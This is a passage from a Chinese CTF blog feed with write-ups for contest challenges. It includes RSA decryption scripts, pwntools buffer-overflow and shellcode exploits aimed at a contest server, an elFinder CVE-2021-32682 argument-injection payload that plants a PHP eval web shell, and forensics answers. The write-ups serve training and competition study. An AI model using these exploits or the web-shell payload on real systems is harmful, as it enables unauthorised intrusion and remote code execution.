class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes, getPrime</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=10527914167368920342295577854040420698608040513653892604918136037544963294095623388091973757715423064586645602171891926735814952937421420715661420333153877</span></span><br><span class="line"><span class="comment"># p1=p&gt;&gt;209</span></span><br><span class="line"><span class="comment"># p2=p&lt;&lt;209</span></span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(p1)</span></span><br><span class="line"><span class="comment"># print(p2)</span></span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="comment"># c = 316373661543805349913021175173178075076043336747584809479404893037761325002836448478929162441358584065273128665159716774937164288497405665632191042332284521034723318938145687304333167955134376408787169266592597190235042275754423249188194807283871814374991344678388696730582580243466934552357008164569586579</span></span><br><span class="line"><span class="comment"># n = 137295590174370258486779692298839352161086651167877263147002621412765977505801742456561849024393193294185122288857756503649721099891079398162452242781237890612610172597434081038114396793013546742597950033582736102625310269690111868650382301222975921369762070823698088192861519989428626676998168867483053538783</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># m = 52634920258495179198202018692852653202467113088262411550134221448755053799027415413277324275128623186460743317639751865203989163790742691124089605187259640154793719189357570000664558301354961450571312688493683682852277885940615012557656614345423380110358955641052222083900962251299983127665464086008108212649</span></span><br><span class="line">m= <span class="number">56006392793407054493666609262667755231281389027552026053722377890467005309920799189185056143150572669</span></span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(m.decode())</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m2 = m.decode()</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="comment"># print(m2)</span></span><br><span class="line"><span class="comment"># print(m1)</span></span><br><span class="line"><span class="comment"># p=14364037588752333310498519350387744613077754808676149648804089522392247361288505668971140852</span></span><br><span class="line"><span class="comment"># p=p&lt;&lt;209</span></span><br><span class="line"><span class="comment"># q=n // p</span></span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line"><span class="comment"># print(m.decode())</span></span><br></pre></td></tr></table></figure><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><p>已知(e,n,c)，求m。（低加密指数攻击）</p><h3 id="enc-py"><a href="#enc-py" class="headerlink" title="enc.py"></a>enc.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p, q = getPrime(<span class="number">32</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> %c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = %d&quot;</span> %n)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 165527641537962453158385346595580222293326378381594431827597366486166401160303849028319637296466564187067059992600278363170882182385646208386765262608536513136513222747556263528436428933807161852842186912918227517362704487324744539937359952905722677507738750871327455083935808647964763470500287612530277</span></span><br><span class="line"><span class="string">n = 345675713266547546727997788631735009412387157990066144394619901220478972853548799919916572067895437774688186483367134372170356307628474622726432885853473078843359790348707975349499704660462018761449242448381765593725869513432095247724237852265875808599860098758473511684359800791176948572617684399894397044344654638787</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">n = <span class="number">345675713266547546727997788631735009412387157990066144394619901220478972853548799919916572067895437774688186483367134372170356307628474622726432885853473078843359790348707975349499704660462018761449242448381765593725869513432095247724237852265875808599860098758473511684359800791176948572617684399894397044344654638787</span></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">c = <span class="number">165527641537962453158385346595580222293326378381594431827597366486166401160303849028319637296466564187067059992600278363170882182385646208386765262608536513136513222747556263528436428933807161852842186912918227517362704487324744539937359952905722677507738750871327455083935808647964763470500287612530277</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot((c+i*n),<span class="number">3</span>)[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">        m = gmpy2.iroot((c+i*n),<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><p><img src="/img/cdutDino3wp/ffecd59b99d6c590a795a6cf10c03118.png"></p><h3 id="py"><a href="#py" class="headerlink" title="py"></a>py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(d)[:-<span class="number">2</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 49390162755988534272839928189991825891307784475755681388594697611101453362175250775346123763727149792590904709709554866101928772410626273560395694701931925004491665335392802508387050154913787966731787005845054735401376590684545817872728193152896069447282539090781054295392440108754707061288239561284988053345</span></span><br><span class="line"><span class="string">d = 596339328004701220895674615970487087143840236892412545268109179554413648178156984971303333524689454052342226732334953464364267428945022850108842486057591229295824078053706083822155009310809557722688312434219946602472705063768084789766044292413211122657306229335083834655999999554553242732078756654198918122</span></span><br><span class="line"><span class="string">n = 77314125696229681333016473406246908467153031859976342194334463502388936222852372550077757802586691889670331381517380504834898109774025642982360455012376588512613635110670341910089851243026132252968232462722302427873254832544089214984924968229850007931672798652990253526875411677891469374519638759569863162731</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><ul><li><p>拼接两位</p></li><li><p>循环解出m遍历一下dino&#x2F;flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="number">49390162755988534272839928189991825891307784475755681388594697611101453362175250775346123763727149792590904709709554866101928772410626273560395694701931925004491665335392802508387050154913787966731787005845054735401376590684545817872728193152896069447282539090781054295392440108754707061288239561284988053345</span></span><br><span class="line"><span class="comment"># d = &quot;596339328004701220895674615970487087143840236892412545268109179554413648178156984971303333524689454052342226732334953464364267428945022850108842486057591229295824078053706083822155009310809557722688312434219946602472705063768084789766044292413211122657306229335083834655999999554553242732078756654198918122&quot;</span></span><br><span class="line">n = <span class="number">77314125696229681333016473406246908467153031859976342194334463502388936222852372550077757802586691889670331381517380504834898109774025642982360455012376588512613635110670341910089851243026132252968232462722302427873254832544089214984924968229850007931672798652990253526875411677891469374519638759569863162731</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = <span class="string">&quot;596339328004701220895674615970487087143840236892412545268109179554413648178156984971303333524689454052342226732334953464364267428945022850108842486057591229295824078053706083822155009310809557722688312434219946602472705063768084789766044292413211122657306229335083834655999999554553242732078756654198918122&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">10</span>):</span><br><span class="line">      j=<span class="number">0</span></span><br><span class="line">      <span class="keyword">while</span>(j&lt;<span class="number">10</span>):</span><br><span class="line">         d1=<span class="built_in">int</span>(d+<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j))</span><br><span class="line">         m = gmpy2.powmod(c, d1, n)  <span class="comment"># 解密</span></span><br><span class="line">         m = long_to_bytes(m)</span><br><span class="line">         j += <span class="number">1</span></span><br><span class="line">         <span class="built_in">print</span>(m)</span><br><span class="line">         <span class="comment"># print(d1)</span></span><br><span class="line">      i+=<span class="number">1</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Stack-gets"><a href="#Stack-gets" class="headerlink" title="Stack_gets"></a>Stack_gets</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./stack_gets&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;47.108.176.78&quot;</span>,<span class="number">9150</span>)</span><br><span class="line">success_addr = <span class="number">0x0000000000400791</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> *<span class="number">0x18</span>+ p64(success_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="stack-one"><a href="#stack-one" class="headerlink" title="stack_one"></a>stack_one</h2><p><img src="/img/cdutDino3wp/dd5a0d1045b44369ac8c4b28b86de61c.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;47.108.176.78&quot;</span>,<span class="number">9137</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./one_getgad&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./one_getgad&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;=====&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">base = puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">one_gadget = base+<span class="number">0x45216</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;=====&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">paylaod = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(one_gadget)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;tell me something&quot;</span>)</span><br><span class="line">io.send(paylaod)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><ul><li>这题除了one_gedget之外，还有一种就是stack pivoting，俗称栈迁移</li></ul><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p><img src="/img/cdutDino3wp/dd5a0d1045b44369ac8c4b28b86de61c.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;47.108.176.78&quot;</span>,<span class="number">9135</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;./pwn/one_getgad&quot;)</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x196082000</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.send(shellcode)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(ret)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Stack-revenge"><a href="#Stack-revenge" class="headerlink" title="Stack_revenge"></a>Stack_revenge</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;备考期间还忙里偷闲，不请自来瞎掺和一脚恐龙的校赛，拿了好几个一血被狠狠地爽到了（）！&lt;/p&gt;
&lt;p&gt;刘师傅听我说谢谢你，因为有你温暖了四季！😋😋&lt;/p&gt;
&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="网络安全" scheme="https://dxhm.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络空间安全" scheme="https://dxhm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="https://dxhm.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>【WP】2022强国杯南部赛区决赛（PART）</title>
    <link href="https://dxhm.github.io/2022/10/23/360qiangguoESouth/"/>
    <id>https://dxhm.github.io/2022/10/23/360qiangguoESouth/</id>
    <published>2022-10-23T11:15:17.000Z</published>
    <updated>2023-07-12T08:55:37.837Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="空白文件"><a href="#空白文件" class="headerlink" title="空白文件"></a>空白文件</h2><p>一个文档,拉进010editor</p><p><img src="/img/qiangguo2wp/image-20221023183857197.png" alt="image-20221023183857197"></p><p><img src="/img/qiangguo2wp/image-20221023184037728.png" alt="image-20221023184037728"></p><h2 id="迷惑的时间"><a href="#迷惑的时间" class="headerlink" title="迷惑的时间"></a>迷惑的时间</h2><p>一个四个图片一个 php</p><p><img src="/img/qiangguo2wp/image-20221023184308017.png" alt="image-20221023184308017"></p><p>flag.php有一个hint: love</p><p><img src="/img/qiangguo2wp/image-20221023184627967.png" alt="image-20221023184627967"></p><p>有一个压缩包,有密码上爆破</p><p><img src="/img/qiangguo2wp/image-20221023184815562.png" alt="image-20221023184815562"></p><p><img src="/img/qiangguo2wp/image-20221023184849178.png" alt="image-20221023184849178"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="超级简单的解密"><a href="#超级简单的解密" class="headerlink" title="超级简单的解密"></a>超级简单的解密</h2><p>压缩包有密码，不是伪加密上爆破</p><p><img src="/img/qiangguo2wp/image-20221023185032071.png"></p><p>手机九键密码 转小写就是flag</p><p><img src="/img/qiangguo2wp/image-20221023185045214.png" alt="image-20221023185045214"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="认真阅读flag"><a href="#认真阅读flag" class="headerlink" title="认真阅读flag"></a>认真阅读flag</h2><ul><li>flag.php：读出一个假flag</li></ul><p><img src="/img/qiangguo2wp/2022-10-23-20-01-38-b3f4e47c2e0bffdc26d939d01d498b1.jpg"></p><ul><li>hint.txt</li></ul><p><img src="/img/qiangguo2wp/2022-10-23-20-01-03-6edbf2dcb45252f5e55b9acae0ded0b.jpg"></p><ul><li><p>exec.php过滤绕过直接读出flag</p><p>payload：</p></li></ul><p><img src="/img/qiangguo2wp/2022-10-23-20-03-07-1216bc99f1460379d29eea5635682cb.png"></p><p><img src="/img/qiangguo2wp/2022-10-23-20-04-18-image.png"></p><h2 id="Create-files"><a href="#Create-files" class="headerlink" title="Create_files"></a>Create_files</h2><p>elFinder版本 &lt;&#x3D; 2.1.58 存在高危漏洞 CVE-2021-32682</p><p><img src="/img/qiangguo2wp/2022-10-23-19-09-30-image.png"></p><p> 创建一个空白txt文本，进行多次压缩，抓包可以获取嵌套文件的base64编码<img src="/img/qiangguo2wp/2022-10-23-19-11-19-image.png"></p><p><img src="/img/qiangguo2wp/2022-10-23-19-30-59-image.png"></p><ul><li><p>虽然中间对参数进行了正则和替换的过滤操作，但是因为程序会将<code>name</code>参数值解析为标志（<code>--foo=bar</code>），可以通过<code>zip</code>的<code>-TT</code>指定要运行的测试命令</p></li><li><p>在传参<code>name</code>处注入木马生成<code>shell.php</code>文件</p></li><li><p>payload</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-TvTT=[命令]&gt;shell.php%20%23%20a.zip</span><br></pre></td></tr></table></figure><p>对注入一句话命令<code>echo &#39;&lt;?php @eval($_POST[a]);?&gt;&#39;</code>进行编码后注入</p><ul><li>最终payload:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-TvTT=%65%63%68%6f%20%27%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%27&gt;shell.php%20%23%20a.zip</span><br></pre></td></tr></table></figure><p><img src="/img/qiangguo2wp/2022-10-23-19-20-05-image.png"></p><p>注入成功可以看到生成了一个<code>shell.php</code>，点击下载，发现木马写入成功</p><p><img src="/img/qiangguo2wp/2022-10-23-19-33-53-image.png"></p><p>连上木马，获取flag</p><p><img src="/img/qiangguo2wp/2022-10-23-19-32-22-image.png"></p><p><img src="/img/qiangguo2wp/2022-10-23-19-39-07-image.png"></p><p><img src="/img/qiangguo2wp/2022-10-23-19-39-14-image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;空白文件&quot;&gt;&lt;a href=&quot;#空白文件&quot; class=&quot;headerlink&quot; title=&quot;空白文件&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="网络安全" scheme="https://dxhm.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络空间安全" scheme="https://dxhm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="https://dxhm.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>【WP】第六届蓝帽杯</title>
    <link href="https://dxhm.github.io/2022/07/09/lanmao-wp/"/>
    <id>https://dxhm.github.io/2022/07/09/lanmao-wp/</id>
    <published>2022-07-08T18:52:32.000Z</published>
    <updated>2023-07-12T08:50:36.756Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>😋蓝帽杯又名取证杯，原来是被队友带飞的一天，有被爽到！</p></blockquote><h3 id="题目序号2-Domainhacker"><a href="#题目序号2-Domainhacker" class="headerlink" title="题目序号2 Domainhacker"></a>题目序号2 Domainhacker</h3><p>公司安全部门，在流量设备中发现了疑似黑客入侵的痕迹，用户似乎获取了机器的hash，你能通过分析流量，找到机器的hash吗？</p><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、打开流量包，导出所有文件</p><p>2、发现1.rar,含有文本</p><p>3、打开所有php页面，用URL和Base64解码</p><p>4、获取关键信息：cd &#x2F;d “c:\\Windows\\Temp”&amp;rar.exe a -PSecretsPassw0rds 1.rar 1.txt</p><p>5、得压缩包密码SecretsPassw0rds，打开文本获取猕猴桃导出的哈希值</p><p><img src="/img/lanmao6/clip_image006.jpg"></p><h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{416f89c3a5deb1d398a1a1fce93862a7}</p><h3 id="题目序号9-手机取证-1"><a href="#题目序号9-手机取证-1" class="headerlink" title="题目序号9 手机取证_1"></a>题目序号9 手机取证_1</h3><p>627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？</p><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>搜索关键字“627604C2-C586-48C1-AA16-FF33C3022159.PNG”，得出唯一图片及其属性。<img src="/img/lanmao6/clip_image008.jpg"></p><h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><p>360x360</p><h3 id="题目序号10-手机取证-2"><a href="#题目序号10-手机取证-2" class="headerlink" title="题目序号10 手机取证_2"></a>题目序号10 手机取证_2</h3><p>姜总的快递单号是多少？</p><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>搜索关键字“姜总”，在skype聊天记录中找到快递单号</p><p><img src="/img/lanmao6/clip_image010.jpg"></p><h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><p>SF1142358694796</p><h3 id="题目序号11-计算机取证-1"><a href="#题目序号11-计算机取证-1" class="headerlink" title="题目序号11 计算机取证_1"></a>题目序号11 计算机取证_1</h3><p>现对一个windows计算机进行取证，请您对以下问题进行分析解答。</p><p>从内存镜像中获得taqi7的开机密码是多少?</p><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>使用取证工具“Passware Kit Forensic”</p><p><img src="/img/lanmao6/clip_image012.jpg"></p><h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><p>anxnqi</p><h3 id="题目序号12-计算机取证-2"><a href="#题目序号12-计算机取证-2" class="headerlink" title="题目序号12 计算机取证_2"></a>题目序号12 计算机取证_2</h3><p>制作该内存镜像的进程Pid号是多少？</p><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>内存分析，找到内存镜像制作工具，获取PID</p><p><img src="/img/lanmao6/clip_image014.jpg"></p><h3 id="flag值：-4"><a href="#flag值：-4" class="headerlink" title="flag值："></a>flag值：</h3><p>2192</p><h3 id="题目序号13-计算机取证-3"><a href="#题目序号13-计算机取证-3" class="headerlink" title="题目序号13 计算机取证_3"></a>题目序号13 计算机取证_3</h3><p>bitlokcer分区某office文件中存在的flag值为？</p><h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、EFDD跑出内存镜像中的bitlocker密钥：368346-029557-428142-651420-492261-552431-515438-338239</p><p>2、盘古石输入密钥解密，导出office文件和字典</p><p>3、用pass.txt做字典爆破，密码：287fuweiuhfiute，打开ppt得flag</p><p><img src="/img/lanmao6/clip_image016.jpg"></p><h3 id="flag值：-5"><a href="#flag值：-5" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{b27867b66866866686866883bb43536}</p><h3 id="题目序号14-计算机取证-4"><a href="#题目序号14-计算机取证-4" class="headerlink" title="题目序号14 计算机取证_4"></a>题目序号14 计算机取证_4</h3><p>TrueCrypt加密中存在的flag值为？</p><h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、EFDD中用内存镜像文件解密容器</p><p><img src="/img/lanmao6/clip_image018.jpg"></p><p>2、加载解密后的容器，提取加密压缩包哈哈哈.zip,爆破，打开得flag</p><p><img src="/img/lanmao6/clip_image020.jpg"></p><h3 id="flag值：-6"><a href="#flag值：-6" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{1349934913913991394cacacacacacc}</p><h3 id="题目序号15-程序分析-1"><a href="#题目序号15-程序分析-1" class="headerlink" title="题目序号15 程序分析_1"></a>题目序号15 程序分析_1</h3><p>现已获取某个APP程序，请您对以下问题进行分析解答。</p><p>本程序包名是？</p><h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、执行:aapt dump badging EXEC.apk</p><p>2、找到包名</p><p><img src="/img/lanmao6/clip_image022.jpg"></p><h3 id="flag值：-7"><a href="#flag值：-7" class="headerlink" title="flag值："></a>flag值：</h3><p>exec.azj.kny.d.c</p><h3 id="题目序号16-程序分析-2"><a href="#题目序号16-程序分析-2" class="headerlink" title="题目序号16 程序分析_2"></a>题目序号16 程序分析_2</h3><p>本程序的入口是？</p><h3 id="操作内容：-8"><a href="#操作内容：-8" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、执行:aapt dump badging 